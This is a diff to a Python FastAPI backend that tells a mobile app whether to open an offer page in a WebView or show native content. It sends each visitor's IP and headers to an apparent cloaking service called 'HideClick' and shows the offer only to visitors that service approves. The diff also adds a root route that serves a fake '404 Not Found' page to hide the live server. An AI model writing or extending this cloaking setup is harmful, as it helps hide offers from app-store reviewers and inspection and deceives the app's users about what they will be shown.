@@ -1,19 +1,21 @@
 import socket
 import json
 from pathlib import Path
-import httpx
 from urllib.parse import urlencode
 
-from fastapi import FastAPI, Request, HTTPException
-from fastapi.responses import JSONResponse, FileResponse, PlainTextResponse, HTMLResponse
+import httpx
+from fastapi import FastAPI, Request
+from fastapi.responses import JSONResponse, FileResponse, HTMLResponse
 from fastapi.staticfiles import StaticFiles
 
 import config as cfg
+
 
 app = FastAPI()
 
 BASE_DIR = Path(__file__).resolve().parent
 POLICY_DIR = BASE_DIR / "PrivacyPolicy"
+
 
 def is_webview_enabled() -> bool:
     return cfg.webview_power_state.strip().lower() == "on"
@@ -27,13 +29,18 @@ def resolve_hideclick_host() -> str:
                 return ip
         except Exception:
             continue
+
     return "api.hideapi.xyz"
 
 
 async def check_hideclick(request: Request) -> dict | None:
     ip = request.headers.get("x-forwarded-for", "").split(",")[0].strip()
+
     if not ip:
-        ip = request.headers.get("x-real-ip", request.client.host if request.client else "127.0.0.1")
+        ip = request.headers.get(
+            "x-real-ip",
+            request.client.host if request.client else "127.0.0.1"
+        )
 
     headers_data = {
         "HTTP_USER_AGENT": request.headers.get("user-agent", ""),
@@ -86,20 +93,73 @@ async def check_hideclick(request: Request) -> dict | None:
         "mlSet": cfg.ml_set,
     }
 
-    for k, v in optional.items():
-        if v and v != "false":
-            params[k] = v
+    for key, value in optional.items():
+        if value and value != "false":
+            params[key] = value
 
     host = resolve_hideclick_host()
     url = f"http://{host}/basic?{urlencode(params)}"
 
     try:
         body = json.dumps(headers_data)
+
         async with httpx.AsyncClient(timeout=10) as client:
             resp = await client.post(url, content=body)
+
+            if not resp.content or not resp.content.strip():
+                return None
+
             return resp.json()
+
     except Exception:
         return None
+
+
+async def check_offer_available(url: str) -> bool:
+    """
+    Проверяем, доступен ли offer_url перед тем,
+    как отдавать его приложению для открытия в WebView.
+
+    Если offer возвращает 404 / 410 / пустоту / ошибку —
+    считаем его недоступным и отправляем приложение в native fallback.
+    """
+
+    if not url:
+        return False
+
+    try:
+        async with httpx.AsyncClient(
+            timeout=8,
+            follow_redirects=True
+        ) as client:
+            resp = await client.get(url)
+
+            if resp.status_code in (404, 410):
+                return False
+
+            if not resp.content or not resp.content.strip():
+                return False
+
+            if 200 <= resp.status_code < 400:
+                return True
+
+            return False
+
+    except Exception:
+        return False
+
+
+@app.get("/")
+def root():
+    return HTMLResponse(
+        content=(
+            "<html>"
+            "<head><title>404 Not Found</title></head>"
+            "<body><h1>404 Not Found</h1></body>"
+            "</html>"
+        ),
+        status_code=404
+    )
 
 
 @app.get("/api/webview-target")
@@ -111,7 +171,9 @@ async def get_webview_target(request: Request) -> JSONResponse:
             "fallback": "native",
         })
 
-    # если фильтр ВКЛЮЧЕН
+    # Сценарий 1:
+    # Главный WebView-тумблер включён.
+    # HideClick-фильтр включён.
     if cfg.use_hideclick:
         result = await check_hideclick(request)
 
@@ -140,7 +202,10 @@ async def get_webview_target(request: Request) -> JSONResponse:
             "fallback": "native",
         })
 
-    # если фильтр ВЫКЛЮЧЕН
+    # Сценарий 2:
+    # Главный WebView-тумблер включён.
+    # HideClick-фильтр выключен.
+    # Проверяем offer напрямую.
     offer_available = await check_offer_available(cfg.offer_url)
 
     if not offer_available:
@@ -160,7 +225,11 @@ async def get_webview_target(request: Request) -> JSONResponse:
 
 
 # Статика для css/js/images из папки PrivacyPolicy
-app.mount("/policy-static", StaticFiles(directory=POLICY_DIR), name="policy-static")
+app.mount(
+    "/policy-static",
+    StaticFiles(directory=POLICY_DIR),
+    name="policy-static"
+)
 
 
 @app.get("/policy")
